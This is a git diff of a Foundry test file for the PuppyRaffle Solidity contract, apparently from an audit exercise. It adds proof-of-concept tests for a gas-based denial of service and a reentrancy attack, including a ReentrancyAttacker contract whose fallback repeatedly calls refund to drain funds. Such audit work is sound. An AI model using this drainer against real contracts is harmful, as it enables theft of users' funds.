@@ -75,50 +75,7 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
     }
 
-    // @audit - PoC for DoS attack
-    // To highlight this vulnerability, we will show the effect of increasing numbers of players
-    // on the gas price to prove that it reaches a point where it is no longer feasible to enter the raffle.
-    function testDenialOfServiceAttack() public {
-        // set gas price
-        vm.txGasPrice(1);
-
-        // enter raffle with 1000 players
-        address[] memory players = new address[](100);
-        for (uint256 i = 0; i < players.length; i++) {
-            players[i] = address(i);
-        }
-
-        // get the gas value before entering the raffle
-        uint256 gasStart = gasleft();
-        // vm.expectRevert();
-        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
-
-        // ge the gas value after entering the raffle
-        uint256 gasEnd = gasleft();
-
-        uint256 gasUsedFirst = gasStart - gasEnd;
-
-        console.log("Gas used for 100 players: ", gasUsedFirst);
-
-                // enter raffle with 1000 players
-        address[] memory players1000 = new address[](1000);
-        for (uint256 i = 0; i < players1000.length; i++) {
-            players1000[i] = address(i+players.length);
-        }
-
-        // get the gas value before entering the raffle
-        uint256 gasStart1000 = gasleft();
-        // vm.expectRevert();
-        puppyRaffle.enterRaffle{value: entranceFee * 1000}(players1000);
-
-        // ge the gas value after entering the raffle
-        uint256 gasEnd1000 = gasleft();
-
-        uint256 gasUsedFirst1000 = gasStart1000 - gasEnd1000;
-
-        console.log("Gas used for 1000 players: ", gasUsedFirst1000);
-    }
-
+    
     //////////////////////
     /// Refund         ///
     /////////////////////
@@ -154,6 +111,7 @@ contract PuppyRaffleTest is Test {
         vm.prank(playerTwo);
         puppyRaffle.refund(indexOfPlayer);
     }
+
 
     //////////////////////
     /// getActivePlayerIndex         ///
@@ -257,4 +215,117 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+
+    ///////////// @audit Tests for vulnerabilities /////////////
+
+    // @audit - PoC for DoS attack
+    // To highlight this vulnerability, we will show the effect of increasing numbers of players
+    // on the gas price to prove that it reaches a point where it is no longer feasible to enter the raffle.
+    function testDenialOfServiceAttack() public {
+        // set gas price
+        vm.txGasPrice(1);
+
+        // enter raffle with 1000 players
+        address[] memory players = new address[](100);
+        for (uint256 i = 0; i < players.length; i++) {
+            players[i] = address(i);
+        }
+
+        // get the gas value before entering the raffle
+        uint256 gasStart = gasleft();
+        // vm.expectRevert();
+        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
+
+        // ge the gas value after entering the raffle
+        uint256 gasEnd = gasleft();
+
+        uint256 gasUsedFirst = gasStart - gasEnd;
+
+        console.log("Gas used for 100 players: ", gasUsedFirst);
+
+                // enter raffle with 1000 players
+        address[] memory players1000 = new address[](1000);
+        for (uint256 i = 0; i < players1000.length; i++) {
+            players1000[i] = address(i+players.length);
+        }
+
+        // get the gas value before entering the raffle
+        uint256 gasStart1000 = gasleft();
+        // vm.expectRevert();
+        puppyRaffle.enterRaffle{value: entranceFee * 1000}(players1000);
+
+        // ge the gas value after entering the raffle
+        uint256 gasEnd1000 = gasleft();
+
+        uint256 gasUsedFirst1000 = gasStart1000 - gasEnd1000;
+
+        console.log("Gas used for 1000 players: ", gasUsedFirst1000);
+    }
+
+
+    ///// @audit - PoC for Reentrancy Attack ///// 
+    // To highlight this vulnerability, we will show the effect of a reentrancy attack on the refund function.
+    function testReentrancyRefund() public {
+        
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        // attack
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("Starting attack contract balance: ", startingAttackContractBalance);
+        console.log("Starting contract balance: ", startingContractBalance);
+
+        console.log("Ending attack contract balance: ", address(attackerContract).balance);
+    }
 }
+
+// we need a contract to test the reentrancy attack
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee = 1e18;
+    uint256 attackerIndex;
+
+    constructor (PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if(address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+
+    }
+}
+
+
